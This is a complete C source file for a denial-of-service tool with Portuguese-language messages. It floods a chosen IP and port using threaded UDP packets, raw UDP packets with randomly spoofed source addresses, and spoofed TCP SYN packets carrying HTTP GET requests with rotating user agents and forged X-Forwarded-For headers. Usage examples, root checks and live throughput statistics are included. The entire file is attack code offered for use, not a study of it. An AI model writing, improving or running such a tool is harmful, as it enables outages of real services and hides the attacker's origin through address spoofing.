#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 10
#define DEFAULT_SIZE 1400
#define MAX_THREADS 100

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int use_raw;
    int use_http;
    char host[128];
    char path[256];
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0"
};

#define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    return (rand() & 0xFF) << 24 |
           (rand() & 0xFF) << 16 |
           (rand() & 0xFF) << 8 |
           (rand() & 0xFF);
}

void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
    snprintf(buffer, size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "X-Real-IP: %d.%d.%d.%d\r\n"
        "X-Client-IP: %d.%d.%d.%d\r\n"
        "Referer: http://%s/\r\n"
        "\r\n",
        path,
        host,
        user_agents[ua_index % NUM_USER_AGENTS],
        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
        host
    );
}

void *raw_http_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char *payload;
    int packet_size;
    time_t end_time;
    char http_request[4096];
    int ua_counter = 0;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket RAW: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[Thread %d] Erro ao configurar IP_HDRINCL: %s\n", args->thread_id, strerror(errno));
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;
    int error_count = 0;

    while (attack_running && time(NULL) < end_time) {
        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        int http_len = strlen(http_request);
        
        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
        
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
        payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        memcpy(payload, http_request, http_len);

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        } else {
            error_count++;
            if (error_count < 10) {
                printf("[Thread %d] Erro sendto: %s (errno: %d)\n", 
                       args->thread_id, strerror(errno), errno);
            }
            if (errno == EPERM || errno == EACCES) {
                printf("[Thread %d] Permissao negada! Execute com sudo.\n", args->thread_id);
                break;
            }
            usleep(1000);
        }

        if (sent_count % 100 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    unsigned char *packet;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket UDP: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
        close(sockfd);
        return NULL;
    }

    packet = malloc(args->packet_size);
    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        random_payload(packet, args->packet_size);
        int result = sendto(sockfd, packet, args->packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }
    }

    free(packet);
    close(sockfd);
    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void *raw_udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket RAW: %s\n", args->thread_id, strerror(errno));
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[Thread %d] Erro ao configurar IP_HDRINCL: %s\n", args->thread_id, strerror(errno));
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        printf("[Thread %d] IP invalido: %s\n", args->thread_id, args->target);
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;
    int error_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        } else {
            error_count++;
            if (error_count < 10) {
                printf("[Thread %d] Erro sendto: %s (errno: %d)\n", 
                       args->thread_id, strerror(errno), errno);
            }
            if (errno == EPERM || errno == EACCES) {
                printf("[Thread %d] Permissao negada! Execute com sudo.\n", args->thread_id);
                break;
            }
            usleep(1000);
        }

        if (sent_count % 1000 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    printf("[Thread %d] Finalizada. Enviados: %d pacotes\n", args->thread_id, sent_count);
    return NULL;
}

void print_stats() {
    static time_t last_print = 0;
    static unsigned long long last_packets = 0;
    static unsigned long long last_bytes = 0;
    time_t now = time(NULL);
    
    if (now - last_print >= 1) {
        unsigned long long pps = packets_sent - last_packets;
        unsigned long long bps = bytes_sent - last_bytes;
        double mbps = (bps * 8) / 1000000.0;
        double gbps = mbps / 1000.0;
        
        printf("\r[+] Pacotes: %llu | PPS: %llu | %.2f Mbps | %.3f Gbps     ",
               packets_sent, pps, mbps, gbps);
        fflush(stdout);
        last_print = now;
        last_packets = packets_sent;
        last_bytes = bytes_sent;
    }
}

void *stats_thread(void *arg) {
    while (attack_running) {
        print_stats();
        usleep(100000);
    }
    return NULL;
}

void print_usage(char *program_name) {
    printf("\n=== UDP/TCP/HTTP FLOOD DOS TOOL ===\n\n");
    printf("Uso: %s <IP> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
    printf("Argumentos obrigatorios:\n");
    printf("  IP       - Endereco IP do alvo\n");
    printf("  PORTA    - Porta de destino\n");
    printf("  TEMPO    - Duracao do ataque em segundos\n\n");
    printf("Opcoes:\n");
    printf("  -t       - Numero de threads (padrao: %d)\n", DEFAULT_THREADS);
    printf("  -s       - Tamanho do pacote (padrao: %d)\n", DEFAULT_SIZE);
    printf("  -r       - Raw socket com spoofing (REQUER ROOT)\n");
    printf("  -http    - HTTP Flood com spoofing (REQUER ROOT)\n");
    printf("  -host    - Hostname para HTTP (padrao: IP)\n");
    printf("  -path    - Caminho HTTP (padrao: /)\n");
    printf("  -h       - Ajuda\n\n");
    printf("Exemplos:\n");
    printf("  %s 192.168.1.1 80 30\n", program_name);
    printf("  sudo %s 192.168.1.1 443 60 -t 20 -s 1400 -r\n", program_name);
    printf("  sudo %s 192.168.1.1 80 30 -http -host exemplo.com -path /index.php\n", program_name);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *target;
    int port, duration;
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_SIZE;
    int use_raw = 0;
    int use_http = 0;
    char host[128] = "";
    char path[256] = "/";
    int opt;

    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }

    target = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    struct sockaddr_in test;
    if (inet_pton(AF_INET, target, &test.sin_addr) <= 0) {
        printf("Erro: IP invalido: %s\n", target);
        return 1;
    }

    strcpy(host, target);

    optind = 4;
    while ((opt = getopt(argc, argv, "t:s:r h")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
                if (num_threads < 1) num_threads = 1;
                break;
            case 's':
                packet_size = atoi(optarg);
                if (packet_size > 1472) packet_size = 1472;
                if (packet_size < 64) packet_size = 64;
                break;
            case 'r':
                use_raw = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    for (int i = optind; i < argc; i++) {
        if (strcmp(argv[i], "-http") == 0) {
            use_http = 1;
            use_raw = 1;
        } else if (strcmp(argv[i], "-host") == 0 && i + 1 < argc) {
            strncpy(host, argv[++i], sizeof(host) - 1);
        } else if (strcmp(argv[i], "-path") == 0 && i + 1 < argc) {
            strncpy(path, argv[++i], sizeof(path) - 1);
        }
    }

    if (use_http && geteuid() != 0) {
        printf("\n[!] HTTP FLOOD REQUER PERMISSAO DE ROOT!\n");
        printf("[!] Execute: sudo %s ...\n\n", argv[0]);
        return 1;
    }

    if (use_raw && geteuid() != 0) {
        printf("\n[!] RAW SOCKET REQUER PERMISSAO DE ROOT!\n");
        printf("[!] Execute: sudo %s ...\n\n", argv[0]);
        return 1;
    }

    printf("\n=== INICIANDO ATAQUE ===\n");
    printf("Alvo: %s:%d\n", target, port);
    printf("Duracao: %d segundos\n", duration);
    printf("Threads: %d\n", num_threads);
    printf("Tamanho do pacote: %d bytes\n", packet_size);
    if (use_http) {
        printf("Tipo: HTTP Flood com spoofing\n");
        printf("Host: %s\n", host);
        printf("Path: %s\n", path);
    } else {
        printf("Tipo: %s\n", use_raw ? "UDP Raw (spoofing)" : "UDP Normal");
    }
    printf("==========================\n\n");

    srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
    signal(SIGPIPE, SIG_IGN);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;
        args[i].use_raw = use_raw;
        args[i].use_http = use_http;
        strncpy(args[i].host, host, sizeof(args[i].host) - 1);
        strncpy(args[i].path, path, sizeof(args[i].path) - 1);

        if (use_http) {
            pthread_create(&threads[i], NULL, raw_http_flood, &args[i]);
        } else if (use_raw) {
            pthread_create(&threads[i], NULL, raw_udp_flood, &args[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_flood, &args[i]);
        }
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(stats_thread_id);
    pthread_join(stats_thread_id, NULL);

    double total_gb = (bytes_sent * 8) / 1000000000.0;

    printf("\n\n[+] Ataque finalizado!\n");
    printf("[+] Total de pacotes enviados: %llu\n", packets_sent);
    printf("[+] Total de dados enviados: %.2f GB\n", total_gb);
    if (duration > 0) {
        printf("[+] Media de PPS: %llu\n", packets_sent / duration);
        printf("[+] Media de Gbps: %.3f\n", total_gb / duration);
    }

    free(threads);
    free(args);

    return 0;
}
